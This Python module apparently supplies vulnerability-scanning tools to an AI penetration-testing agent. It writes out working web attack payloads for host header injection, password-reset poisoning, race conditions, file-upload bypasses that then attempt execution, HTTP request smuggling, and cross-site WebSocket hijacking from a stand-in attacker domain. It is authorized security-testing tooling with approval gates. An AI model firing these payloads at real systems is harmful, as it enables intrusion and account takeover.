import json
import requests
import re
import time
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Host Header Injection
# ==========================================
@tool("host_header_injection_scanner")
def host_header_injection_scanner(url: str) -> str:
    """
    Scan untuk Host Header Injection vulnerability.
    Mencakup:
    - Password reset poisoning via Host header
    - Cache poisoning via X-Forwarded-Host
    - Internal service routing bypass
    - Port-based injection
    """
    tool_name = "Host Header Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting host header injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    findings = {"vulnerabilities": [], "suspicious": []}

    attack_headers = [
        {"Host": "attacker-nexus.com"},
        {"Host": f"{domain}.attacker-nexus.com"},
        {"Host": f"attacker-nexus.com:{80}"},
        {"X-Forwarded-Host": "attacker-nexus.com"},
        {"X-Host": "attacker-nexus.com"},
        {"X-Forwarded-Server": "attacker-nexus.com"},
        {"X-HTTP-Host-Override": "attacker-nexus.com"},
        {"Forwarded": "host=attacker-nexus.com"},
    ]

    logger.add_log(tool_name, "PROCESSING", "Testing host header injection vectors")
    for attack_header in attack_headers:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            r = requests.get(url, headers=attack_header, timeout=5, verify=False)

            # Check if attacker domain appears in response
            if "attacker-nexus.com" in r.text:
                findings["vulnerabilities"].append({
                    "type": "Host Header Injection (Reflected)",
                    "injected_header": attack_header,
                    "evidence": "Attacker domain reflected in response body",
                    "impact": ["Password reset poisoning", "Cache poisoning", "SSRF"],
                    "severity": "High"
                })
                logger.add_log(tool_name, "WARNING", f"Host header injection: {attack_header}")
                break

            # Check redirect location header
            if r.status_code in [301, 302, 307] and "attacker-nexus.com" in r.headers.get("Location", ""):
                findings["vulnerabilities"].append({
                    "type": "Host Header Injection (Redirect)",
                    "injected_header": attack_header,
                    "evidence": f"Redirect to attacker domain: {r.headers.get('Location')}",
                    "severity": "Critical"
                })
                logger.add_log(tool_name, "WARNING", "Host header injection in redirect!")
                break

            # Server responded without error = possibly vulnerable
            if r.status_code == 200:
                findings["suspicious"].append({
                    "header": attack_header,
                    "status": 200,
                    "note": "Server accepted spoofed host without error — manual verification needed"
                })

        except Exception:
            pass

    # Check password reset specific
    base = url.rstrip("/")
    reset_paths = ["/forgot-password", "/reset-password", "/password/reset"]
    for rp in reset_paths:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            r = requests.get(f"{base}{rp}", timeout=4, verify=False)
            if r.status_code == 200:
                # Try poisoning the reset request
                rate_limiter.wait(domain)
                r2 = requests.post(
                    f"{base}{rp}",
                    data={"email": "victim@example.com"},
                    headers={"X-Forwarded-Host": "attacker-nexus.com"},
                    timeout=4, verify=False
                )
                if r2.status_code in [200, 201, 302]:
                    findings["suspicious"].append({
                        "type": "Possible Password Reset Poisoning",
                        "endpoint": f"{base}{rp}",
                        "severity": "High",
                        "note": "Server accepted reset request with spoofed host — check if reset email uses X-Forwarded-Host"
                    })
                break
        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["suspicious"] else "SAFE"
        ),
        "findings": findings
    }
    logger.add_log(tool_name, "SUCCESS", "Host header injection scan complete")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 2: Race Condition Scanner
# ==========================================
@tool("race_condition_scanner")
def race_condition_scanner(url: str, method: str = "POST", body: str = "", headers_json: str = "", concurrency: int = 20) -> str:
    """
    Scan untuk Race Condition vulnerability.
    Sending banyak request secara concurrent untuk exploit timing windows.
    Common targets: coupon redeem, transfer funds, vote systems, rate limits.
    url: target endpoint
    method: HTTP method (GET/POST)
    body: request body for POST
    headers_json: JSON string of headers
    concurrency: number of concurrent requests (default 20)
    """
    tool_name = "Race Condition Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting race condition scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"Race Condition scan pada {url}",
        context=f"Sending {concurrency} concurrent {method} requests ke {url} secara bersamaan",
        risk="high",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    extra_headers = {}
    if headers_json:
        try:
            extra_headers = json.loads(headers_json)
        except Exception:
            pass

    results = []
    lock = threading.Lock()

    def send_request(req_id):
        try:
            start = time.monotonic()
            if method.upper() == "GET":
                r = requests.get(url, headers=extra_headers, timeout=10, verify=False)
            else:
                r = requests.post(url, data=body or {}, headers=extra_headers, timeout=10, verify=False)
            elapsed = time.monotonic() - start
            with lock:
                results.append({
                    "req_id": req_id,
                    "status": r.status_code,
                    "response_length": len(r.content),
                    "elapsed_ms": round(elapsed * 1000),
                    "response_preview": r.text[:100]
                })
        except Exception as e:
            with lock:
                results.append({"req_id": req_id, "error": str(e)})

    logger.add_log(tool_name, "PROCESSING", f"Firing {concurrency} concurrent requests")

    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(send_request, i) for i in range(concurrency)]
        for f in as_completed(futures):
            pass  # results collected via callback

    # Analyze results
    successful = [r for r in results if "status" in r and r["status"] in [200, 201, 204]]
    status_codes = [r.get("status") for r in results if "status" in r]
    response_lengths = [r.get("response_length", 0) for r in results if "response_length" in r]

    unique_statuses = set(status_codes)
    unique_lengths = set(response_lengths)

    race_indicators = []

    # Multiple different response lengths = race condition likely
    if len(unique_lengths) > 2:
        race_indicators.append(f"Response length variance: {unique_lengths} — possible race condition")

    # High success rate on supposedly rate-limited endpoint
    if len(successful) > concurrency * 0.8:
        race_indicators.append(f"{len(successful)}/{concurrency} requests succeeded — possible rate limit bypass")

    # Mixed 200/4xx = some went through, some didn't
    if 200 in unique_statuses and any(s >= 400 for s in unique_statuses):
        race_indicators.append("Mixed 200 and 4xx responses — classic race condition signature")

    finding = {
        "url": url,
        "concurrency": concurrency,
        "method": method,
        "total_requests": len(results),
        "successful": len(successful),
        "unique_status_codes": list(unique_statuses),
        "unique_response_lengths": list(unique_lengths),
        "race_indicators": race_indicators,
        "severity": "High" if race_indicators else "Unknown",
        "sample_responses": results[:5]
    }

    result = {
        "status": "LIKELY_VULNERABLE" if race_indicators else "SAFE",
        "findings": finding,
        "note": "Race condition requires manual exploitation to confirm. Use results above as indicators."
    }
    logger.add_log(tool_name, "SUCCESS", f"Race condition scan complete. Indicators: {len(race_indicators)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 3: File Upload Bypass Scanner
# ==========================================
@tool("file_upload_scanner")
def file_upload_scanner(url: str, file_param: str = "file") -> str:
    """
    Scan untuk File Upload vulnerability:
    - MIME type bypass
    - Double extension (.php.jpg)
    - Null byte injection (.php%00.jpg)
    - Polyglot files (valid image yang juga valid PHP/JS)
    - Content-Type bypass
    - File extension blacklist bypass
    url: file upload endpoint
    file_param: name of the file input parameter (default: "file")
    """
    tool_name = "File Upload Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting file upload scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"File Upload scan pada {url}",
        context=f"Mengupload file dengan berbagai ekstensi dan MIME bypass ke param '{file_param}'",
        risk="high",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    findings = {"vulnerabilities": [], "accepted_files": []}

    # Safe webshell content (non-harmful marker — just echoes)
    php_content = b"<?php echo 'NEXUS_UPLOAD_TEST'; ?>"
    jsp_content = b'<% out.println("NEXUS_UPLOAD_TEST"); %>'
    html_content = b'<script>document.write("NEXUS_UPLOAD_TEST")</script>'

    # Polyglot: valid GIF header + PHP code
    polyglot_gif_php = b"GIF89a" + b"\x01\x00\x01\x00" + php_content

    upload_tests = [
        # (filename, content, content_type, description)
        ("test.php", php_content, "application/php", "PHP file with php content-type"),
        ("test.php", php_content, "image/jpeg", "PHP file with image/jpeg MIME"),
        ("test.php.jpg", php_content, "image/jpeg", "Double extension .php.jpg"),
        ("test.php%00.jpg", php_content, "image/jpeg", "Null byte .php%00.jpg"),
        ("test.PhP", php_content, "application/php", "Case variation .PhP"),
        ("test.phtml", php_content, "image/jpeg", "Alternative PHP ext .phtml"),
        ("test.php5", php_content, "image/jpeg", "Alternative PHP ext .php5"),
        ("test.shtml", html_content, "image/jpeg", "Server-side include .shtml"),
        ("test.gif", polyglot_gif_php, "image/gif", "Polyglot GIF+PHP"),
        ("test.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml", "SVG with XSS"),
        ("test.jsp", jsp_content, "image/jpeg", "JSP file with image MIME"),
        (".htaccess", b"AddType application/x-httpd-php .jpg", "text/plain", ".htaccess override"),
    ]

    for filename, content, content_type, description in upload_tests:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            files = {file_param: (filename, content, content_type)}
            r = requests.post(url, files=files, timeout=8, verify=False)

            if r.status_code in [200, 201]:
                # Check if file was accepted (not rejected)
                rejected_keywords = ["invalid", "not allowed", "forbidden", "error", "rejected", "blocked"]
                was_rejected = any(kw in r.text.lower() for kw in rejected_keywords)

                if not was_rejected:
                    # Try to find the uploaded file URL in response
                    url_pattern = re.search(r'https?://[^\s"\'<>]+(?:\.php|\.phtml|\.php5|\.shtml|\.jsp|\.gif|\.svg)', r.text)
                    uploaded_url = url_pattern.group(0) if url_pattern else None

                    findings["accepted_files"].append({
                        "filename": filename,
                        "description": description,
                        "status": r.status_code,
                        "uploaded_url": uploaded_url,
                        "severity": "Critical" if any(ext in filename for ext in [".php", ".phtml", ".php5", ".shtml", ".jsp", ".htaccess"]) else "High"
                    })
                    logger.add_log(tool_name, "WARNING", f"File upload accepted: {filename} ({description})")

                    # If PHP file accepted and URL found, try to execute it
                    if uploaded_url and any(ext in filename for ext in [".php", ".phtml", ".php5"]):
                        rate_limiter.wait(domain)
                        try:
                            exec_r = requests.get(uploaded_url, timeout=5, verify=False)
                            if "NEXUS_UPLOAD_TEST" in exec_r.text:
                                findings["vulnerabilities"].append({
                                    "type": "Remote Code Execution via File Upload",
                                    "filename": filename,
                                    "executed_url": uploaded_url,
                                    "severity": "Critical"
                                })
                                logger.add_log(tool_name, "WARNING", f"RCE CONFIRMED via file upload: {uploaded_url}")
                        except Exception:
                            pass

        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["accepted_files"] else "SAFE"
        ),
        "findings": findings,
        "note": "Check 'accepted_files' — even without confirmed RCE, accepted dangerous files are high risk"
    }
    logger.add_log(tool_name, "SUCCESS", f"File upload scan complete. Accepted: {len(findings['accepted_files'])}, RCE: {len(findings['vulnerabilities'])}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 4: HTTP Request Smuggling Scanner
# ==========================================
@tool("http_request_smuggling_scanner")
def http_request_smuggling_scanner(url: str) -> str:
    """
    Scan untuk HTTP Request Smuggling (CL.TE dan TE.CL).
    Sending raw HTTP requests dengan conflicting Content-Length dan Transfer-Encoding.
    Detection berdasarkan timing dan response behavior.
    """
    tool_name = "HTTP Request Smuggling Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting HTTP request smuggling scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    findings = {"vulnerabilities": [], "suspicious": []}

    # Parse URL
    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"

    # ── CL.TE Detection (timing-based) ────────────────────────────────────────
    # CL.TE: Content-Length says body is short, TE says to read until \r\n0\r\n
    # If CL.TE vuln: backend hangs waiting for rest of chunk
    logger.add_log(tool_name, "PROCESSING", "Testing CL.TE smuggling (timing-based)")

    cl_te_payloads = [
        # CL.TE: CL says 6 bytes, TE says chunked — backend waits for rest of chunk
        (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "3\r\n"
            "abc\r\n"
            "X",  # incomplete chunk — backend hangs waiting
            "CL.TE"
        ),
    ]

    # We use requests session with manual headers to test CL.TE via HTTP/1.1
    # Note: proper smuggling needs raw socket, but we can detect via timing
    for payload, smuggle_type in cl_te_payloads:
        if check_cancelled(logger): break
        try:
            # Method: send request with both CL and TE headers
            rate_limiter.wait(domain)
            start = time.monotonic()
            r = requests.post(
                url,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "6",
                },
                data="3\r\nabc\r\nX",  # malformed chunk
                timeout=6, verify=False
            )
            elapsed = time.monotonic() - start

            if elapsed > 4.0:
                findings["vulnerabilities"].append({
                    "type": f"HTTP Request Smuggling ({smuggle_type})",
                    "evidence": f"Server hung for {elapsed:.1f}s — possible {smuggle_type} vulnerability",
                    "severity": "Critical"
                })
                logger.add_log(tool_name, "WARNING", f"Request smuggling ({smuggle_type}) timing indicator: {elapsed:.1f}s")
            elif r.status_code in [400, 411, 501]:
                findings["suspicious"].append({
                    "type": smuggle_type,
                    "status": r.status_code,
                    "note": "Server rejects conflicting headers — may be protected or just strict"
                })
        except requests.Timeout:
            findings["vulnerabilities"].append({
                "type": f"HTTP Request Smuggling ({smuggle_type})",
                "evidence": "Request timed out — server hung waiting for rest of smuggled body",
                "severity": "Critical"
            })
            logger.add_log(tool_name, "WARNING", f"Request smuggling timeout — likely {smuggle_type}")
        except Exception:
            pass

    # ── TE.CL Detection ───────────────────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing TE.CL smuggling")
    try:
        rate_limiter.wait(domain)
        start = time.monotonic()
        r = requests.post(
            url,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
                "Content-Length": "4",  # CL says 4 bytes, but TE says more
            },
            data="5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
            timeout=6, verify=False
        )
        elapsed = time.monotonic() - start
        if elapsed > 4.0:
            findings["suspicious"].append({
                "type": "TE.CL",
                "elapsed": elapsed,
                "note": "Possible TE.CL — manual verification with raw socket recommended"
            })
    except requests.Timeout:
        findings["suspicious"].append({
            "type": "TE.CL",
            "note": "Timeout — possible TE.CL, manual raw socket testing recommended"
        })
    except Exception:
        pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["suspicious"] else "SAFE"
        ),
        "findings": findings,
        "note": "HTTP smuggling is complex — timing-based detection may have false positives. Use Burp Suite HTTP Request Smuggler for definitive testing."
    }
    logger.add_log(tool_name, "SUCCESS", "HTTP request smuggling scan complete")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 5: WebSocket Security Scanner
# ==========================================
@tool("websocket_security_scanner")
def websocket_security_scanner(url: str) -> str:
    """
    Scan untuk WebSocket security vulnerabilities:
    - Missing auth on WebSocket connections
    - Missing origin check (CSWSH — Cross-Site WebSocket Hijacking)
    - Message injection
    - Insecure WS (ws:// instead of wss://)
    url: target URL (akan di-detect apakah ada WS endpoint)
    """
    tool_name = "WebSocket Security Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting WebSocket security scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    base = url.rstrip("/")
    findings = {"vulnerabilities": [], "ws_endpoints": [], "info": []}

    # ── 1. Detect WebSocket endpoints dari page source ────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Detecting WebSocket endpoints in page source")
    try:
        rate_limiter.wait(domain)
        r = requests.get(url, timeout=8, verify=False)

        # Find WS URLs in page source
        ws_pattern = re.findall(r'["\']?(wss?://[^\s"\'<>]+)["\']?', r.text)
        ws_from_js = re.findall(r'new WebSocket\(["\']([^"\']+)["\']', r.text)

        all_ws = list(set(ws_pattern + ws_from_js))
        for ws_url in all_ws:
            findings["ws_endpoints"].append(ws_url)
            if ws_url.startswith("ws://"):
                findings["vulnerabilities"].append({
                    "type": "Insecure WebSocket (ws:// instead of wss://)",
                    "url": ws_url,
                    "severity": "Medium",
                    "detail": "WebSocket connection is unencrypted — MITM possible"
                })
                logger.add_log(tool_name, "WARNING", f"Insecure WS detected: {ws_url}")

    except Exception as e:
        logger.add_log(tool_name, "WARNING", f"Page analysis error: {e}")

    # ── 2. Common WS endpoint paths ───────────────────────────────────────────
    ws_paths = ["/ws", "/websocket", "/socket", "/ws/chat", "/api/ws", "/realtime", "/live"]
    logger.add_log(tool_name, "PROCESSING", "Checking common WebSocket upgrade paths")
    for ws_path in ws_paths:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            # Send WebSocket upgrade request headers
            upgrade_headers = {
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Version": "13",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                "Origin": "https://attacker.com",  # Cross-origin — testing CSWSH
            }
            r = requests.get(f"{base}{ws_path}", headers=upgrade_headers, timeout=5, verify=False)

            if r.status_code == 101:
                findings["ws_endpoints"].append(f"{base}{ws_path}")
                # 101 with cross-origin = CSWSH vulnerability
                findings["vulnerabilities"].append({
                    "type": "Cross-Site WebSocket Hijacking (CSWSH)",
                    "url": f"{base}{ws_path}",
                    "detail": "WebSocket upgrade succeeded with cross-origin (attacker.com) — no origin check",
                    "severity": "High"
                })
                logger.add_log(tool_name, "WARNING", f"CSWSH possible: {ws_path}")
            elif r.status_code == 426:
                findings["info"].append(f"WS upgrade required at {ws_path} (426)")
        except Exception:
            pass

    # ── 3. Check Upgrade-Insecure-Requests policy ─────────────────────────────
    try:
        rate_limiter.wait(domain)
        r = requests.get(url, timeout=5, verify=False)
        csp = r.headers.get("Content-Security-Policy", "")
        if "upgrade-insecure-requests" not in csp and findings["ws_endpoints"]:
            findings["info"].append("upgrade-insecure-requests not in CSP — ws:// connections may not be upgraded to wss://")
    except Exception:
        pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else "SAFE",
        "findings": findings,
        "ws_endpoints_found": len(findings["ws_endpoints"])
    }
    logger.add_log(tool_name, "SUCCESS", "WebSocket security scan complete")
    return json.dumps(result, indent=2)
